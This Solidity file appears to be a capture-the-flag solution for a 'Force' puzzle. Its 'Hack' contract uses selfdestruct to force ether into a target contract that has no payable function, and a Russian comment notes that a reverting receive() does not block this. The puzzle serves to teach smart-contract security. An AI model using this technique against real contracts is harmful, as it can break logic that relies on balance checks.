// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/

    function balance() external view returns(uint) {
        return address(this).balance;
    }

    // Наличие реализованного метода receive() с вызовом revert() не решает проблему
    // receive() external payable {
    //     revert();
    // }
}

contract Hack {
    function kill(address payable _force) external {
        selfdestruct(_force);
    }
    receive() external payable {}
}